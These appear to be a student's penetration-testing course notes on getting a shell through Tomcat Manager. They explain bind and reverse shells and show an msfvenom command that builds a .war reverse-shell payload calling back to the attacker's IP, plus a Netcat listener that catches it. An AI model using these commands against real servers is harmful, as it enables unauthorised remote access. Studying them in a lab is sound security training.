# Tomcat — Crafting a malicious .war File

This part of the course was about generating a malicious .war file that can be uploaded to the Tomcat Manager to get a shell.

We can use MSFvenom for this, since it provides different payloads for different situations.

## Bind Shell vs Reverse Shell

There are two common types of shells:

- Bind shell — the target opens a listening port, and we connect to it.
- Reverse shell — the target connects back to our machine, so we need to have a listener waiting for the connection.

There are also staged and unstaged payloads.

- A staged payload sends the payload in separate stages. The initial payload is smaller and then retrieves the rest.
- An unstaged payload contains the complete payload in one piece.

## Generating the WAR File

For this exercise, I used MSFvenom to generate a .war file containing a reverse shell payload.

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.122.1 LPORT=4444 -f war -o file.war
```

The important options here are:

- `-p` — specifies the payload.
- `LHOST` — the IP address the target should connect back to.
- `LPORT` — the port used for the connection.
- `-f war` — specifies the WAR file format.
- `-o` — specifies the output filename.

Once the `.war` file was generated, I could upload and deploy it through the Tomcat Manager.

## Listening for the Connection

Because this was a reverse shell, I also needed a listener on my machine.

For this exercise, I used Netcat:

```bash
nc -lvp 4444
```

Here:

- `nc` — Netcat.
- `-l` — listen for an incoming connection.
- `-v` — verbose mode.
- `-p` — specifies the listening port.

With the listener running, triggering the deployed application caused the target to connect back to my machine.

## Initial Access

After triggering the deployed application, I got a shell on the target and found that I was running as the `tomcat55` user.

At this point, I had initial access, but I was not root.

I remember wondering why getting root access was such an important part of these exercises. I already knew that the root user has unrestricted privileges on a Linux system, but this was where I started to understand why privilege escalation matters: having access to a machine does not necessarily mean having full control over it.

The next lessons focus on finding a way to escalate from the `tomcat55` user to `root`.
